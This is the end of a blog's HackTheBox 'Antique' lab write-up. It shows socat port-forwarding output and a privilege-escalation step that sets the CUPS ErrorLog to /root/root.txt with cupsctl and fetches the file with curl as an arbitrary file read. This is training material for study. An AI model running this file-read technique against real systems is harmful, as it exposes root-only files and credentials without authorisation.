</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:9797            0.0.0.0:*               LISTEN      21137/socat         
</span></span><span class=line><span class=cl>tcp6       <span class=m>0</span>      <span class=m>0</span> ::1:631                 :::*                    LISTEN      -                   
</span></span><span class=line><span class=cl>lp@antique:/home/lp$ ps aux <span class=p>|</span> grep socat
</span></span><span class=line><span class=cl>lp         <span class=m>19247</span>  0.0  0.0   <span class=m>9028</span>  <span class=m>3484</span> pts/1    S+   17:35   0:00 socat tcp-listen:9090,fork TCP:127.0.0.1:631
</span></span><span class=line><span class=cl>lp         <span class=m>21137</span>  0.0  0.0   <span class=m>9028</span>  <span class=m>3368</span> ?        S    18:38   0:00 socat tcp-listen:9797,fork tcp:127.0.0.1:631
</span></span><span class=line><span class=cl>lp         <span class=m>27338</span>  0.0  0.0   <span class=m>8500</span>   <span class=m>748</span> pts/4    S+   22:32   0:00 grep socat
</span></span></code></pre></div><p><a href=https://www.cups.org/doc/man-cupsctl.html>cupsctl</a> is available on this system. Using that utility, I can change the error log path to the file path that I want to read, which in this case is the root flag, and then send a GET request to <code>localhost:631/admin/log/error_log</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>lp@antique:/home/lp$ cupsctl <span class=nv>ErrorLog</span><span class=o>=</span><span class=s2>&#34;/root/root.txt&#34;</span>
</span></span><span class=line><span class=cl>lp@antique:/home/lp$ curl -s localhost:631/admin/log/error_log
</span></span><span class=line><span class=cl>5d6d4...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><div class=post-references><h2>References</h2><ul><li><a href=https://stackoverflow.com/questions/54806076/cups-bad-request target=_blank rel="noopener noreferrer">https://stackoverflow.com/questions/54806076/cups-bad-request</a></li><li><a href="http://www.irongeek.com/i.php?page=security/networkprinterhacking" target=_blank rel="noopener noreferrer">http://www.irongeek.com/i.php?page=security/networkprinterhacking</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/network-printer/>Network-printer</a></li><li><a href=https://fahmifj.github.io/tags/snmp/>SNMP</a></li><li><a href=https://fahmifj.github.io/tags/cups/>CUPS</a></li><li><a href=https://fahmifj.github.io/tags/arbitrary-file-read/>Arbitrary-file-read</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Antique on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Antique&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fantique%2f&hashtags=Linux%2cNetwork-printer%2cSNMP%2cCUPS%2cArbitrary-file-read"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Antique on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fantique%2f&title=HackTheBox%20-%20Antique&summary=HackTheBox%20-%20Antique&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fantique%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Antique on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fantique%2f&title=HackTheBox%20-%20Antique"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Antique on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fantique%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Antique on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Antique%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fantique%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Antique on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Antique&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fantique%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>